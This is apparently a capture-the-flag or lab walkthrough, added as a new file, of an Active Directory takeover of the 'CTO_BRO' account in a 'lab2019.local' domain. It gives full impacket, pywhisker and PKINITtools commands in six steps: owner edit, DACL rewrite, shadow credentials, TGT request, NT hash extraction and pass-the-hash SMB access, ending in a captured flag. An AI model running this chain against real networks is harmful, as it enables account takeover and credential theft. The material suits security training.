@@ -1,0 +1,71 @@
+
+Step 1 — owneredit
+
+You run this as lowpriv against CTO_BRO. You're exploiting the WriteOwner ACE that Managers has over CTO_BRO.
+
+bash
+impacket-owneredit -action write -new-owner lowpriv -target CTO_BRO \
+  -dc-ip 172.16.61.136 'lab2019.local/lowpriv:Passw0rd123!'
+What you gain: you are now the owner of CTO_BRO's AD object.
+
+Why that's not enough yet: ownership in AD doesn't mean you can do anything to the account directly. It just means you're allowed to edit the permissions on it. You still have no actual rights over CTO_BRO's attributes.
+
+Step 2 — dacledit
+
+You run this as lowpriv against CTO_BRO. Because you're now the owner, the DC lets you rewrite the permissions.
+
+bash
+impacket-dacledit -action write -rights FullControl -principal lowpriv \
+  -target CTO_BRO -dc-ip 172.16.61.136 'lab2019.local/lowpriv:Passw0rd123!'
+What you gain: FullControl over CTO_BRO's AD object — meaning you can read and write any attribute on that account, including msDS-KeyCredentialLink.
+
+Why that's not enough yet: having write access to an attribute doesn't log you in as CTO_BRO. You still have no Kerberos ticket, no session, no hash. You just have a key to a filing cabinet.
+
+Step 3 — pywhisker
+
+You run this as lowpriv. It generates a certificate, writes the public key into CTO_BRO's msDS-KeyCredentialLink attribute, and saves the private key locally as a .pfx file with a password.
+
+bash
+pywhisker -d lab2019.local -u lowpriv -p 'Passw0rd123!' \
+  --dc-ip 172.16.61.136 --target CTO_BRO --action add --filename cto_key
+What you gain: the DC will now accept your certificate as proof that you are CTO_BRO for Kerberos authentication. You also have cto_key.pfx and its password printed in the output.
+
+Why that's not enough yet: you have the credentials but you haven't authenticated yet. You need to present that certificate to the DC and actually get a Kerberos ticket issued in CTO_BRO's name.
+
+Step 4 — gettgtpkinit
+
+You present the .pfx certificate to the DC. The DC validates it against the key in msDS-KeyCredentialLink and issues a TGT for CTO_BRO. It also prints an AS-REP encryption key — save this.
+
+bash
+python3 ~/PKINITtools/gettgtpkinit.py lab2019.local/CTO_BRO \
+  -cert-pfx cto_key.pfx -pfx-pass <pfx_password_from_step3> cto.ccache
+What you gain: a valid Kerberos TGT for CTO_BRO stored in cto.ccache. You are now authenticated as CTO_BRO in Kerberos terms.
+
+Why that's not enough yet: you don't have CTO_BRO's NT hash yet. Without the hash you can't do pass-the-hash. The hash is buried inside the ticket, encrypted, and only extractable using the AS-REP key printed in this step.
+
+Step 5 — export KRB5CCNAME + getnthash
+
+You set the environment variable so tools know where to find the TGT, then run getnthash with the AS-REP key from step 4.
+
+bash
+export KRB5CCNAME=$(pwd)/cto.ccache
+python3 ~/PKINITtools/getnthash.py lab2019.local/CTO_BRO -key <AS-REP_key_from_step4>
+What you gain: CTO_BRO's actual NT hash — the raw credential Windows uses internally for authentication.
+
+Why that's not enough yet: you have the hash but you haven't connected to anything yet. The hash is just a credential. You still need to present it to a service to get access.
+
+Step 6 — smbclient with PTH
+
+You pass the NT hash directly to smbclient as authentication. The DC accepts it, issues a session, and you're in as CTO_BRO.
+
+bash
+impacket-smbclient lab2019.local/CTO_BRO@WIN-JOCP945SK51.lab2019.local \
+  -hashes :<NT_hash_from_step5> -k -no-pass
+```
+```
+# use CTOFiles
+# cat flag.txt
+Shadow_Creds_CEO_Pwned
+What you gain: authenticated SMB access to anything CTO_BRO can reach.
+
+Why nothing more is needed: you're fully authenticated as CTO_BRO. Game over.
